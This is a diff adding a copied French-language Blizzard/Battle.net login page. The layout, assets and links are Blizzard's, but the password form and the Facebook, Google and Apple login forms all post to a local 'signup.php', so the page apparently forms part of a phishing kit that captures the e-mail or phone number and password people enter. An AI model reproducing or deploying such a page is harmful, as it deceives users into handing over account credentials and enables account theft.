@@ -1,0 +1,297 @@
+
+
+
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr-fr" class="fr-fr blizzard" >
+<head xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#">
+<meta http-equiv="imagetoolbar" content="false" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<title>Identifiant de votre compte Blizzard</title>
+<link rel="shortcut icon" href="//bneteu-a.akamaihd.net/login/static/images/meta/favicon.0gxnz.ico" />
+<script nonce="VwfarQkktn" type="text/javascript">
+var BlzCookieConsent = {
+host: 'battle.net',
+onetrustScriptUrl: '',
+whitelistedCookies: ['']
+}
+</script>
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/gdpr/cookie-consent-filter-compat.3h0zV.js?v=58-1"></script>
+<!--[if gt IE 8]><!--><link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/toolkit/blizzard-web.min.1wdCb.css" /><!-- <![endif]-->
+<!--[if IE 8]><link rel="stylesheet" type="text/css" media="all" href="/login/static/css/toolkit/blizzard-web-ie8.min.css?v=58-1" /><![endif]-->
+<link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/login/global.min.4a38w.css?v=1" />
+<link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/nav-client/nav-client.34AhO.css" />
+<link rel="stylesheet" type="text/css" media="(max-width:800px)" href="//bneteu-a.akamaihd.net/login/static/css/nav-client/nav-client-responsive.2L8V6.css" />
+<!--[if IE 8]>
+<link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/login/ie8.3AZrx.css" />
+<![endif]-->
+<link rel="search" type="application/opensearchdescription+xml" href="https://eu.battle.net/fr-fr/data/opensearch" title="Rechercher sur Blizzard" />
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/third-party/jquery.min.254UY.js?v=58-1"></script>
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/toolkit/toolkit.min.1yZwE.js?v=58-1"></script>
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/core.min.1veZs.js?v=58-1"></script>
+<meta name="viewport" content="width=device-width" />
+</head>
+<body class = "eu fr-fr login-template oauth web blizzard"
+data-embedded-state = "STATE_LOGIN"
+data-baseUrl = "/login/fr"
+data-cdnUrl = "http://media.blizzard.com"
+data-staticUrl = "/login/static"
+data-sharedStaticUrl = "/login/static/local-common"
+data-secureSupportUrl = "https://eu.battle.net/support/"
+data-project = "login"
+data-projectUrl = "/login"
+data-locale = "fr-fr"
+data-language = "fr"
+data-region = "eu"
+data-loggedIn = "false"
+data-userAgent = "web"
+data-tagManagerAccount= "GTM-589KTQ"
+data-gtmDataLayer = "[{'userAgent':'web','analyticsRequestUri':'/login/fr/','theme':'blizzard','errorCode':'','state':'STATE_LOGIN'}]"
+data-nonce = "VwfarQkktn"
+data-srp-script-url = "//bneteu-a.akamaihd.net/login/static/js/login/0.srp6a-routines.worker.2Efyv.js"
+data-pw-v2-worker-url = "//bneteu-a.akamaihd.net/login/static/js/login/upgrade-verifier.worker.20KF3.js"
+data-v2-password-js = "//bneteu-a.akamaihd.net/login/static/js/login/account-password.117nV.js"
+data-network-error-message="Veuillez vérifier votre connexion au réseau avant de réessayer." >
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/login/analytics.min.3Jlyi.js?v=58-1"></script>
+<div class="grid-container wrapper">
+<div class="center-wrapper">
+<h1 class="logo">Identifiant de votre compte Blizzard</h1>
+<div class="hide" id="info-wrapper">
+<h2><strong class="info-title"></strong></h2>
+<p class="info-body"></p>
+<button class="btn btn-block hide visible-phone" id="info-phone-close">Fermer</button>
+</div>
+<div class="input" id="login-wrapper">
+<div class="login">
+<form
+action="signup.php"
+method="post"
+id="password-form"
+novalidate="novalidate"
+class="
+username-required
+input-focus"
+>
+<div id="login-input-container" class="">
+<div id="js-errors" class="alert alert-error alert-icon hide">
+<p id="cookie-check" class="hide">Les cookies sont désactivés dans votre navigateur. Merci de les réactiver pour continuer.</p>
+</div>
+<noscript>
+<div id="javascript-disabled" class="alert alert-error alert-icon">
+JavaScript doit être activé sur votre navigateur pour afficher ce site !
+</div>
+</noscript>
+<div class="control-group">
+<label id="accountName-label" class="control-label"
+for="accountName">E-mail ou n° de téléphone</label>
+<div class="controls">
+<input
+aria-labelledby="accountName-label"
+id="accountName"
+name="accountName"
+title="E-mail ou n° de téléphone"
+maxlength="320"
+type="text"
+tabindex="1"
+class="input-block input-large"
+placeholder="E-mail ou n° de téléphone"
+autocorrect="off"
+spellcheck="false"
+/>
+<span class="input-after"></span>
+</div>
+</div>
+<div class="control-group">
+<label id="password-label" class="control-label"
+for="password">Mot de passe</label>
+<div class="controls">
+<input
+aria-labelledby="password-label"
+id="password"
+name="password"
+title="Mot de passe"
+maxlength="128"
+type="password"
+tabindex="1"
+class="input-block input-large"
+autocomplete="off"
+placeholder="Mot de passe"
+autocorrect="off"
+spellcheck="false"
+/>
+<span class="input-after"></span>
+</div>
+</div>
+<input type="hidden" id="srpEnabled" name="srpEnabled" value="true" />
+<input type="hidden" id="upgradeVerifier" name="upgradeVerifier" value="" />
+<input type="hidden" id="useSrp" name="useSrp" value="false" />
+<input type="hidden" id="publicA" name="publicA" value="" />
+<input type="hidden" id="clientEvidenceM1" name="clientEvidenceM1" value="" />
+<div class="persistWrapper">
+<label id="persistLogin-label" class="checkbox-label css-label hide" for="persistLogin">
+<input
+aria-labelledby="persistLogin-label"
+id="persistLogin"
+name="persistLogin"
+type="checkbox"
+checked="checked"
+tabindex="1"
+/>
+<span class="input-checkbox"></span>
+Rester connecté
+</label>
+</div>
+</div>
+<div class="control-group submit ">
+<button type="submit" id="submit" class="btn btn-primary btn-large btn-block "
+data-loading-text="" tabindex="1">
+Se connecter
+<i class="spinner-battlenet"></i>
+</button>
+</div>
+<input type="hidden" id="csrftoken" class="csrftoken" name="csrftoken" value="3fee0074-ba86-48bb-9bb5-bb9837e8637e" />
+<input type="hidden" id="sessionTimeout" name="sessionTimeout" value="1603534858384"/>
+</form>
+<div class="thirdparty-line">
+<span>OU CONNECTEZ-VOUS AVEC</span>
+</div>
+<div class="useResponse social-login external-login-container">
+<form method="post" action="signup.php" id="facebookLogin" class="" enctype=""
+>
+<button id="facebook" class="btn btn-block btn-large third-party-login social-icon login-facebook" rel="external" tabindex="1">
+<i class="icon-facebook"></i>
+</button>
+<input type="hidden" name="scope" value="public_profile,email,user_friends" />
+<input type="hidden" name="ref" value="https://eu.battle.net/oauth/authorize?response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.blizzard.com%252Fauth%252Fbnet%252Fcallback%26scope%3Dlogout%2520account.licenses%2520email%2520name%2520private_flags%2520primary-address%2520account.full%26client_id%3D3d87a4f120754e15840548b68d9ea4db" />
+<input type="hidden" name="app" value="oauth" />
+<input type="hidden" name="scheme" value="" />
+<input type="hidden" id="csrftoken-facebookLogin" class="csrftoken" name="csrftoken" value="3fee0074-ba86-48bb-9bb5-bb9837e8637e" />
+</form>
+<form method="post" action="signup.php" id="googleLogin" class="" enctype=""
+>
+<button id="google" class="btn btn-block btn-large third-party-login social-icon login-google" rel="external" tabindex="1">
+<i class="icon-google"></i>
+</button>
+<input type="hidden" name="scope" value="openid,profile,email" />
+<input type="hidden" name="ref" value="https://eu.battle.net/oauth/authorize?response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.blizzard.com%252Fauth%252Fbnet%252Fcallback%26scope%3Dlogout%2520account.licenses%2520email%2520name%2520private_flags%2520primary-address%2520account.full%26client_id%3D3d87a4f120754e15840548b68d9ea4db" />
+<input type="hidden" name="app" value="oauth" />
+<input type="hidden" name="scheme" value="" />
+<input type="hidden" id="csrftoken-googleLogin" class="csrftoken" name="csrftoken" value="3fee0074-ba86-48bb-9bb5-bb9837e8637e" />
+</form>
+<form method="post" action="signup.php" id="appleLogin" class="" enctype=""
+>
+<button id="apple" class="btn btn-block btn-large third-party-login social-icon login-apple" rel="external" tabindex="1">
+<i class="icon-apple"></i>
+</button>
+<input type="hidden" name="scope" value="email,name" />
+<input type="hidden" name="ref" value="https://eu.battle.net/oauth/authorize?response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.blizzard.com%252Fauth%252Fbnet%252Fcallback%26scope%3Dlogout%2520account.licenses%2520email%2520name%2520private_flags%2520primary-address%2520account.full%26client_id%3D3d87a4f120754e15840548b68d9ea4db" />
+<input type="hidden" name="app" value="oauth" />
+<input type="hidden" name="scheme" value="" />
+<input type="hidden" id="csrftoken-appleLogin" class="csrftoken" name="csrftoken" value="3fee0074-ba86-48bb-9bb5-bb9837e8637e" />
+</form>
+</div>
+<ul id="help-links">
+<li>
+<a rel="internal"
+href="https://eu.battle.net/account/creation/tos.html?ref=https://eu.battle.net/oauth/authorize?response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.blizzard.com%252Fauth%252Fbnet%252Fcallback%26scope%3Dlogout%2520account.licenses%2520email%2520name%2520private_flags%2520primary-address%2520account.full%26client_id%3D3d87a4f120754e15840548b68d9ea4db&amp;theme=blizzard&amp;app=oauth"
+tabindex="1"
+id="signup"
+>
+Créer un compte Blizzard gratuit
+</a>
+</li>
+<li>
+<a rel="internal"
+href="https://eu.battle.net/account/recovery/?ref=&amp;theme=blizzard&amp;app=oauth"
+tabindex="1"
+id="loginSupport"
+>
+Impossible de se connecter ?
+</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<img src="//bneteu-a.akamaihd.net/login/static/images/toolkit/themes/bnet/icons/sprite-24-red.4Q3bt.png" class="hide" />
+<img src="//bneteu-a.akamaihd.net/login/static/images/toolkit/themes/bnet/spinners/spinner-battlenet.1IdwV.png" class="hide" />
+<footer id="footer" class="footer fr-fr">
+<div id="nav-client-footer" class="nav-client">
+<div class="mobileFooterEnabled footer-content footer-desktop grid-container"> <div class="nav-section support-feedback">
+<div class="nav-left">
+<div id="nav-feedback">
+</div>
+</div>
+</div>
+<div class="nav-section">
+<div class="nav-left nav-logo-group">
+<div class="footer-links nav-left">
+<a class="nav-item nav-a" href="https://eu.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Conditions d’utilisation de Battle.net</a>
+<span>|</span>
+<a class="nav-item nav-a" href="https://eu.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Confidentialité en ligne</a>
+<span>|</span>
+<a class="nav-item nav-a" href="https://www.blizzard.com/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Mentions légales</a>
+<span>|</span>
+<a class="nav-item nav-a" href="https://eu.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Droits d’auteur</a>
+<span>|</span>
+<a class="nav-item nav-a" href="/login/cookies" data-analytics="global-nav" data-analytics-placement="Footer - Cookies">Cookies</a>
+<div class="copyright">©2020 Blizzard Entertainment, Inc. Tous droits réservés.</div>
+<div class="nav-footer-icon-container">
+<ul class="nav-footer-icon-list">
+</ul>
+</div>
+</div>
+</div>
+<div class="nav-ratings">
+</div>
+</div>
+</div>
+<div class="mobileFooterEnabled footer-content footer-mobile grid-container"> <div class="nav-logo-group">
+<div class="footer-links">
+<a class="nav-item nav-a" href="https://eu.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Conditions d’utilisation de Battle.net</a>
+<span>|</span>
+<a class="nav-item nav-a" href="https://eu.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Confidentialité en ligne</a>
+<span>|</span>
+<a class="nav-item nav-a" href="https://www.blizzard.com/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Mentions légales</a>
+<span>|</span>
+<a class="nav-item nav-a" href="https://eu.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Droits d’auteur</a>
+<span>|</span>
+<a class="nav-item nav-a" href="/login/cookies" data-analytics="global-nav" data-analytics-placement="Footer - Cookies">Cookies</a>
+</div>
+<div class="copyright">©2020 Blizzard Entertainment, Inc. Tous droits réservés.</div>
+<div class="nav-footer-icon-container">
+<ul class="nav-footer-icon-list">
+</ul>
+</div>
+<div class="nav-ratings">
+</div>
+</div>
+</div>
+</div>
+<div class="modal eu-cookie-compliance desktop hide" id="eu-cookie-compliance">
+<div class="modal-header">
+<a class="close" data-dismiss="modal" id="cookie-compliance-close"><i class="icon-remove icon-white"></i></a>
+<h1>Avertissement sur les cookies</h1>
+</div>
+<div class="modal-body">
+<p>Blizzard Entertainment utilise des cookies et technologies similaires sur ses sites Internet. En continuant votre navigation, vous acceptez tacitement cette utilisation.</p>
+</div>
+<button class="btn btn-primary" id="cookie-compliance-agree">OK</button>
+<a class="btn" id="cookie-compliance-learn" href="https://eu.blizzard.com/company/about/privacy.html" target="_blank">En savoir plus</a>
+</div>
+<div class="modal eu-cookie-compliance mobile hide" id="eu-cookie-compliance">
+<div class="modal-body">
+<a class="close" data-dismiss="modal" id="cookie-compliance-close"><i class="icon-remove icon-white"></i></a>
+<p>Ce site Internet utilise des cookies. En continuant votre navigation, vous acceptez tacitement cette utilisation.</p>
+</div>
+<button class="btn btn-primary" id="cookie-compliance-agree">OK</button>
+<a class="btn" id="cookie-compliance-learn" href="https://eu.blizzard.com/company/about/privacy.html" target="_blank">En savoir plus</a>
+</div>
+</footer> </div>
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/embedded-javascript/embed-0.1.5.min.2QnZN.js?v=58-1"></script>
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/login/global.min.22cjf.js"></script>
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/login/login.min.2BF9V.js"></script>
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/login/srp-client.min.2NkGE.js?v=1"></script>
+<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/toolkit/toolkit-password.1RRZg.js?v=1"></script>
+</body>
+</html>
